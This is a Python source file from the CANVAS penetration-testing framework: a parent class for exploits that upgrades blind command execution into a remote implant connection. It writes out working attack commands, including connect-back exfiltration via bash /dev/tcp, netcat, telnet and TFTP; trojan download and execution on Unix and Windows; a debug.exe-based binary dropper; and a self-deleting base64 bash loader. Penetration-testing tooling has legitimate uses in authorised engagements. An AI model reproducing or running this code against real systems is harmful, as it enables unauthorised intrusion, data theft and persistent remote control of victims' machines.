#! /usr/bin/env python

#
# CANVAS generic CommandLine Exploit
#

"""
Meant to be used as a multiple inheritance parent
for a canvasexploit


Essentially this works in a weird way:
You give it the ability to execute commands blindly, and it will
then try to convert them to execute non-blindly, by getting output
via TCP/FTP/TFTP/etc.

Once it has the ability to execute commands non-blindly, it will
determine it's host-OS and then upload a MOSDEF to it 
and execute it.

The benefit is that all you need is the ability to repeatedly 
execute commands against a target, and it will do the rest.
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")


import os ,getopt, sys, traceback
import socket
from exploitutils import *
import time
import random
from libs.canvasos import canvasos
import canvasengine
from shellcode import shellcodeGenerator
from MOSDEF import pelib 
from libs.tftpy import *
from internal import devlog


class upload_listener:
    def __init__(self):
        self.bintype    = None
        self.connection = None
        self.listentype = None
        self.data       = None
        self.getsock    = None #used to get tcp sockets and such

class tftp_upload_listener(upload_listener):
    def __init__(self):
        upload_listener.__init__(self)
        self.listentype = "TFTP"
        self.tftpd      = None 
        self.readyinput = None 
        self.alluploads = None #change to [] for uploads
        self.done       = False 
    
    def listen(self, port=69):
        """
        Initialize our tftp server. You only get one of these at a time!
        """
        myserver = TftpServer(allfiles=self.data, getsock=self.getsock, alluploads=self.alluploads)
        try:
            myserver.listen()
        except socket.error, message :
            logger.error("socket.error message: %s" % message)
            return False
        
        self.tftpd = myserver
        return True 
    
    def accept(self):
        """
        Accept a rrq (will assume any activity on the socket is a RRQ)
        """
        logger.info("TFPTD Accept called")
        if not self.tftpd:
            return False 
        ret=self.tftpd.check_sockets()
        if not ret:
            self.readyinput=None 
            return False 
        self.readyinput=ret 
        return True 
    
    def read_data(self):
        """
        Read data packets from remote server and return result in a string
        """
        #secretly the same as send_file :>
        self.send_file()
        self.tftpd.upload_finished=self.upload_finished 
        return "".join(self.alluploads)
    
    def upload_finished(self):
        "Callback for when the upload is finished"
        devlog("commandlineexecuter", "TFTP upload finished")
        self.done=True
        return 
        
    def send_file(self):
        """
        
        """
        #need to add a self.halt() so we can quit this loop
        #without waiting the X seconds
        waittime=5
        if not self.readyinput:
            logger.info("TFTP uploader: Must accept first...")
            return False 
        
        while self.readyinput:
            self.tftpd.handle_active_sockets(self.readyinput)
            self.accept()
            if self.done:
                return True 
            #no packet found, so we wait and then try again
            if not self.readyinput:
                time.sleep(waittime)
                self.accept()
                if self.done:
                    return True 
                #if we don't have a packet now, we assume we're done
        return True 
    
    def close(self):
        devlog("commandlineexecuter", "Closing tftpd listener")
        if self.tftpd:
            self.tftpd.close()
        return 
    
class tcp_upload_listener(upload_listener):    
    def __init__(self):
        upload_listener.__init__(self)
        self.fd              = None 
        self.listentype      = "TCP"
    
    def accept(self):
        """Accept and handle timeouts"""
        try:
            (self.fd, self.addy)=self.connection.accept()
            self.getsock.log("TCP client connected from %s"%str(self.addy))
        except Exception, ex:
            return False
        return True
    
    def listen(self,port):
        try:
            s = self.getsock.gettcplistener(port)
            self.connection = s
            return s
        except socket.error, ex:
            pass
        return False
        
    def close(self):
        """close our sockets"""
        if self.fd:
            self.fd.close()
            self.fd=None
        self.connection.close()
        self.connection=None
        return 
    
    def send_file(self):
        """returns true if we were able to send the file"""
        if not self.fd:
            return False 
        if self.data==None:
            print "Cannot send None over the wire!"
            return False 
        try:
            self.fd.sendall(self.data)
            self.getsock.log("Sent data!")
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            return False
        return True 

def get_upload_listener(listentype):
    if listentype=="TFTP":
        return tftp_upload_listener()
    elif listentype=="TCP":
        return tcp_upload_listener()
    return None 
    
class CommandExploit:
    """
    Exploits that inherit from this inherit the ability
    to pop up a MOSDEF node or other form of interactive 
    access given only the ability to run one command - even if
    that command is run entirely blind.
    
    You can set the target_os to a CANVASOS class and it will
    start making assumptions based on that information. For example
    Unix vs Win32, or Linux RedHat vs Linux Suse, etc.
    """
    def __init__(self):
        self.blind                        = True # (default to blind)
        self.multi                        = 1 #can we run this multiple times? (default to yes!)
        self.target_os                    = None
        self.auto_port_tries              = 10
        
        #your exploit will need to set this if you want to be sane
        self.max_command_length           = 50000
        self.listen_port                  = 8080
        self.capabilities                 = [] #list of things we know the target can do for us
                                               #for example, "telnet" , "nc" ,"ftp", "wget", "outbound80" etc.
        self.writable_and_executable_dirs = []
        self.outfilename                  = "ps_"
        self.upload_listener              = None 
        self.callback_port                = None
        
        #if copycmd is set then we need to copy cmd.exe to cmd1.exe or
        #similar
        self.copycmd                      = None  #cmd.exe name 
        self.outputdir                    = None #writable directory
        self.docmdcpy                     = False 
        self.cmdexename                   = "cmd.exe" #change this if needed
        self.cmddir                       = "winnt//system32/"
        self.original_cmddir              = None
        self.original_cmdexename          = None 
        self.linuxWritableDirs            = ["/dev/shm/","/tmp/","./","/var/tmp/"]
        self.solWritableDirs              = ["/tmp/","./","/var/tmp/"]
        self.osxWritableDirs              = ["/tmp/", "/var/tmp/"]
        self.supports_universal           = False #by default for old exploits we'll leave this as false

    def getargs_cle(self):
        """
        Gets arguments specific to the commandline executer
        """
        self.listen_port=self.argsDict.get("listen_port", self.listen_port)
        #have to account for when we are in test and have no listener 
        if self.callback:
            self.callback_ip=self.callback.ip
            self.callback_port=self.callback.port
        else:
            self.callback_ip=self.engine.get_callback_interface(self.target.interface)
            self.callback_port=self.callback_port
            
        return 
                                           
    def cle_neededListenerTypes(self):
        "depending on the version of target we need to return a different listener"
        if self.supports_universal:
            return [canvasengine.UNIVERSAL_MOSDEF]
        if self.target_os.base=="Linux" and self.target_os.arch=="x86":
            return [canvasengine.LINUXMOSDEF]
        elif self.target_os.base=="Windows":
            return [canvasengine.WIN32MOSDEF]
        else:
            #error!
            self.log("Error in neededListenerTypes for os %s" % str(self.target_os))
        return []
        
    # This is better than a list of possible directories, but relies on the %TEMP% variable.
    # My suggestion is to implement the api GetTempPath in mosdef in order to obtain the Path of the temp directory.        
    def get_win32WritableDirs(self, node):
        temp_dir = node.runcommand("echo %TEMP%")
        return [temp_dir.strip()+"\\"]
    
    def get_os(self):
        """
        requires gettcplistener having been defined by a canvasexploit, of course
        """
        if self.target_os!=None:
            self.log("Using supplied target os: %s"%self.target_os)
            return 
        
        #initialize our new os for returning
        newos=canvasos()
        
        #this solves the problem of test() running an exploit
        #against a target, which is not what we want to do
        #if running from scanner()
        if not self.argsDict.get("autohack_state",self.autohack_state):
            #if we are not autohacking, we should NOT attempt this stuff
            #as it is overly agressive!
            self.log("Not autohacking - so we need to run test() in nice mode")
            return 
        
            
        self.log("Checking to see if I can get a uname from remote target")
        result = "Unknown"
        
        if self.blind:
            # Try and bind on the given port else try self.auto_port_tries times at random ports before giving up
            tcp_s = self.gettcplistener(self.listen_port)

            port = self.listen_port
            
            if not tcp_s:
                self.log('Could not bind listener at port %d, trying random ports..' % self.listen_port)
                for _ in range(0, self.auto_port_tries):
                    port = random.randint(1025, 65535)
                    tcp_s = self.gettcplistener(port)
                    if tcp_s: break
                if not tcp_s:
                    self.log('Maximum tries exhausted, could not bind listener, giving up..')
                    return
                
                self.listen_port = port
                
            self.log('Got listener at port: %s' % self.listen_port)

            #these time out, if we accept() on them
            localhost=self.callback_ip
            bashcommand="bash -c \"uname -a > /dev/tcp/%s/%d \""%(localhost, self.listen_port)
            telnetcommand="uname -a | telnet %s %d "%(localhost, self.listen_port)
            nccommand="uname -a | nc %s %d "%(localhost, self.listen_port)
            tcpcommands=[bashcommand, telnetcommand, nccommand]
            allcommands=tcpcommands[:]
            tftp=tftp_upload_listener()
            tftp.alluploads=[] #our upload list which will recv data
            ret=tftp.listen()
            
            if ret:
                self.log("We were able to listen on port 69 - set up a TFTPserver")
                #we were able to listen on port 69, so we add our tftp here
                tftpcommand = "tftp -i %s PUT c:\\boot.ini" % localhost
                tftpcommands = [tftpcommand]
                allcommands = tftpcommands + allcommands
            else:
                self.log("We were unable to set up a TFTP server")
            #FTP, WGET, lynx, etc

            for command in allcommands:
                if command in tcpcommands:
                    s=tcp_s 
                elif command in tftpcommands:
                    s=tftp 
                self.log("Trying command: %s"%command)
                #run_blind_command cannot block!
                ret=self.run_blind_command(command)
                if not ret:
                    self.log("We don't think we ran that command...")
                try:
                    ret=s.accept()
                except:
                    self.log("No connectback with command: %s"%command)
                    #timeout
                    continue

                if ret and command in tcpcommands:
                    (fd, addy)=ret 
                    self.log("Accepted connection from %s"%str(addy))
                    result=fd.recv(1000)
                    fd.close()                        

                elif ret and command in tftpcommands:
                    self.log("Got TFTP connectback")
                    newos.base="Windows" #only windows has this format of command
                    result=tftp.read_data()
                    self.capabilities+=["tftp"]
                    self.log("Closing TFTP Server explicitly")
                    tftp.close()
                        
                if result and result != "Unknown":
                    self.log("Found result blindly: %s" % result)
                    if command == telnetcommand:
                        self.capabilities += ["telnet"]
                    elif command == nccommand:
                        self.capabilities += ["nc"]
                    elif command == bashcommand:
                        self.capabilities += ["bash"]
                    s.close()
                    break
                
            s.close()
        else:
            self.log("Not blind...let's test for the os locally")
            unixuname=["uname -a"]
            windowsuname=["type c:\\boot.ini"]
            commands=unixuname+windowsuname
            os_detected = False
            for command in commands:
                result=self.runcommand(command)
                for success in ["Windows","Linux","Solaris","BSD"]:
                    if result.count(success):
                        os_detected = True
                        break
                if os_detected:
                    break    
                # self.log("Got %s as a result of our command"%result)
        
        # if we got a uname at all...
        if result != 'Unknown':
            self.log("OS found via Uname: %s" % result)
            newos.load_uname(result)
            self.target_os=newos
            self.log("Loaded new target os: %s"%str(self.target_os))
        return 
    
    def check_upload_listener(self):
        """
        Checks the upload listener and sends the file is possible
        """
        ret = 0
        if not self.upload_listener:
            self.log("No need to check upload listener")
            return True 

        try:
            if self.multi == 0:
                while (ret==0): 
                    time.sleep(2)        
                    ret=self.upload_listener.accept()
                   
                ret=self.upload_listener.send_file()
                if ret:
                    self.log("Sent file to remote server!")
                    
                return ret
        except:
            pass        
                                 
        self.log("Sleeping 5 seconds to wait for connection")

        start_time = time.time()
        while time.time() - start_time < 5.0 and ret == 0:
            ret = self.upload_listener.accept()
            time.sleep(0.1)

        if not ret:
            self.log("No one connected back to me")
            return False 

        ret = self.upload_listener.send_file()
        if ret:
            self.log("Sent file to remote server!")
        else:
            self.log("We got a connectback but were unable to send the file!")
        
        return ret
    
        
    def init_upload_listener(self, listentype, bintype):
        """
        We create a new variable self.upload_listener that is ready for
        an "accept" and return True if successful.
        """
        if listentype in ["TCP", "TFTP"]:
            newlistener         = get_upload_listener(listentype)
            newlistener.getsock = self
            newlistener.bintype = bintype
            newlistener.data    = self.mosdeftrojan
            newlistener.listen(self.listen_port)
        else:
            self.log("Listentype %s not understood during init_upload_listener!"%listentype)
            return False
        
        self.upload_listener = newlistener
        return True
                     
    
    def get_debugcommands(self, outputfilename, outputdirectory):
        """
        Returns a list of commands which will upload a debug
        script to write our MOSDEF file. This is useful
        on Windows where the outgoing TFTP is blocked
        or when we're doing a massattack and only
        one exploit can listen to port 69 at a time.
        
        Debug.exe takes a simple commandset. You appear
        to be able to write any number of bytes as defined
        by BX:CX.
        
        Right now this assumes the cwd is writable. Need to fix this to also
        take in the output directory for debug.txt.
        
        IIS does not support using debug.exe (ntvdm will
        hit 100% cpu)
        http://support.microsoft.com/kb/176965
        """
        
        ret=[]
        if self.docmdcpy:
            #need to copy cmd.exe to another name to use
            #this against IIS or similar
            #you can't use it against IIS itself
            #because it doesn't allow you to run
            #debug.exe (16 bit program)
            if not self.original_cmdexename:
                self.original_cmdexename=self.cmdexename
            if not self.original_cmddir:
                self.original_cmddir=self.cmddir
                
            cmdexename="c.exe"
            command="copy \\winnt\\system32\\cmd.exe %s%s"%(outputdirectory,cmdexename)
            self.log("Running command to copy cmd.exe %s"%command)
            #copy these from backups
            self.cmddir=self.original_cmddir
            self.cmdexename=self.original_cmdexename
            bRet=self.run_blind_command(command)
            if not bRet:
                self.log("Did not copy correctly?")
            else:
                self.log("Copy completed correctly")
            self.cmdexename=cmdexename
            
            if outputdirectory:
                self.cmddir=outputdirectory
            else:
                self.log("no output directory - assuming we copied into cwd which was system32")

        newoutputfilename=outputfilename.lower().replace(".exe",".txt")
        #first initialize our script
        ret+=["echo N %s > debug.txt"%newoutputfilename]
        data=self.mosdeftrojan
        size=len(self.mosdeftrojan)
        address=0
        while data!="":
            hexes=""
            #we don't use commas because they screw up
            #some filters. So we'll just use spaces, which
            #debug.exe thinks are fine too
            for a in data[:16]:
                hexes+="%2.2x "%ord(a)
            hexes=hexes[:-1] #remove last " "
            command="echo E %d %s >> debug.txt"%(address,hexes)
            ret+=[command]
            data=data[16:]
        #Write the file
        #set rcx register
        ret+=["echo rcx >> debug.txt"]

        #TODO:if size > 65535 then set bx as well...
        ret+=["echo %4.4x >> debug.txt"%size]
        ret+=["echo W >> debug.txt"] #write file
        ret+=["echo Q >> debug.txt"] #quit debug session
        #now run our script against our file
        ret+=["debug.exe < debug.txt"]
        #we have to copy it back to it's original name
        #debug won't write a .exe.
        ret+=["copy \"%s\" \"%s\""%(newoutputfilename, outputfilename)]
        ret2=[]
        rnum=random.randint(1,6000)
        for r in ret:
            ret2+=[r.replace("debug.txt","%sdebug%d.txt"%(outputdirectory,rnum))]
        ret=ret2 
        return ret 

    def encoded_in_bash_script(self, data):
        script = '''#!/bin/bash

        echo -ne "{encoded}" | base64 -d > {fname};
        chmod +x {fname}
        ./{fname} &
        rm -- "$0"
        '''

        data = data.encode('base64').replace('\n', '')
        fname = randomstring(8)
        return script.format(encoded=data, fname=fname)

        
    def upload_and_execute(self, encoded=False):
        """
        This function is called by an exploit which
        implements our interface. We will need
        the ability to open local sockets to push files
        down. We will modify self.target_os to specify 
        what we have learned.
        
        We use the function exploit::run_one_command() to
        attempt to run a command on the target.
        """
        if self.callback==None:
            self.log("No callback in upload_and_execute - we need a listener by now!")
            return False 
        localhost=self.callback.ip
        localport=self.callback.port
        self.log("uploading an executing a trojan to connectback to %s %d"%(localhost, localport))

        #buildmosdeftrojan is inherited from canvasexploit
        if self.supports_universal:
            self.buildmosdeftrojan(localhost, localport, self.target_os, universal=True)
        else:
            self.buildmosdeftrojan(localhost, localport, self.target_os)

        if self.target_os.isUnix():
            #if we're on a unix-like machine
            self.writable_and_executable_dirs=self.solWritableDirs
            self.outfilename=randomstring(4)
            if encoded:
                self.mosdeftrojan = self.encoded_in_bash_script(self.mosdeftrojan)
        else:
            #windows
            self.writable_and_executable_dirs=self.win32WritableDirs
            self.outfilename="W%d.EXE"%random.randint(50,100)

        uploadcommands={}
        #TCP means a file is downloaded from TCP like via netcat
        #TFTP means we have to set up a TFTP server to upload the file to the target
        #MOSDEF means the file is included in our upload command, and we just have to check to see if it runs
        uploadcommands["bash"]=("bash -c \"cat < /dev/tcp/%s/%d > FILENAME\""%(localhost, self.listen_port),"TCP","binary")
        uploadcommands["telnet"]=("telnet %s %d "%(localhost, self.listen_port),"TCP","text")
        uploadcommands["nc"]=("nc %s %d "%(localhost, self.listen_port),"TCP","binary")
        uploadcommands["tftp"]=("tftp -i %s GET %s FILENAME"%( localhost, self.outfilename), "TFTP", "binary") 
        
        uploadcommands["debug.exe"]=(self.get_debugcommands,"MOSDEF","binary")
        if 1:
            #transfer programs take host and port and connect to us to get data
            for transferprogram in self.capabilities:
                for outdir in self.writable_and_executable_dirs:
                    outfilename=outdir+self.outfilename 
                    command, listentype, bintype = uploadcommands[transferprogram]
                    #open up the listening TCP/HTTP/TFTP/ETC port
                    self.init_upload_listener(listentype, bintype)

                    #if it's a function, then let it create
                    #a string or list for us based on our
                    #output filename 
                    if callable(command):
                        command=command(outfilename, outdir)

                    #Send our blind command[s] (must not block!)
                    if type(command)==type("abcd"):
                        #we have a single command in a string
                        if "FILENAME" not in command:
                            command=command + " > " + outfilename
                        else:
                            command = command.replace("FILENAME",outfilename)

                        self.log("Upload command: %s"%command)
                        if self.blind:
                            self.run_blind_command(command)
                        else: self.runcommand(command)
                    elif type(command)==type([]):
                        #we need to run a list of commands
                        i=0
                        total=len(command)
                        for com in command:
                            #check to see if we're halted
                            if self.state==self.HALT:
                                return False 
                            #otherwise run our command
                            self.log("Running command(%d/%d): %s"%(i,total,com))
                            if self.blind:
                                self.run_blind_command(com)
                            else: self.runcommand(com)
                            time.sleep(0.5)
                            i+=1 #increment our count of the commands we've run
                            
                    #now upload the file
                    uploaded=self.check_upload_listener()
                    if self.upload_listener:
                        self.log("Closing upload listener")
                        self.upload_listener.close()
                    if not uploaded:
                        self.log("File was not uploaded . . .trying next command")
                        continue

                    #now construct a command for running the file
                    #need to set it executable on Unix-oses
                    if self.target_os.isUnix():
                        if command.startswith('telnet '):
                            # telnet in *nix OS append to stdout the text below:
                            # Trying 172.168.130.122...
                            # Connected to 172.168.130.122.
                            # Escape character is '^]'.
                            # we need to cut this bytes from the binary
                            skip_bytes = 52 + len(localhost) * 2
                            fname_tmp  = outfilename + ".tmp"
                            mv_and_dd_command = "mv {} {} && dd if={} of={} skip={} bs=1".format(
                                outfilename, fname_tmp, fname_tmp, outfilename, skip_bytes)
                            # move the original filename to tmp location and
                            # cut the junk and save into the original file
                            if self.blind:
                                self.run_blind_command(mv_and_dd_command)
                            else:
                                self.runcommand(mv_and_dd_command)
                            time.sleep(1)
                        command="chmod +x %s;"%outfilename+outfilename+" &"
                    else:
                        #Windows
                        command=outfilename
                    if self.blind:
                        self.run_blind_command(command)
                    else:
                        self.runcommand(command)
                    time.sleep(5)
                    #now see if we got a MOSDEF connection!
                    if not self.ISucceeded():
                        self.log("File was not run or could not connect back")
                        continue
                    else:
                        self.log("We got a MOSDEF connection!")
                        return True 
     
    def run_blind_command(self, command):
        """
        If we dont need to override this, then
        it's assumed we have run_command instead
        """
        data=self.run_command(command, blind=1)
        if data:
            return True
        return False 
                    
                                        
if __name__ == '__main__':

    if 0:
        #download testing
        print "Intializing"
        myserver=tftp_upload_listener()
        myserver.alluploads=[]
        print "Listening"
        myserver.listen()
        print "Accepting"
        ret=myserver.accept()
        while not ret:
            #timeout...
            print "Accepting"
            ret=myserver.accept()
        print "Reading data"
        data=myserver.read_data()
        print "Done..."
        print "Data=%s"%data
        
    if 1:
        #for upload testing
        myserver=TftpServer(allfiles="HI"*1024)
        myserver.run()
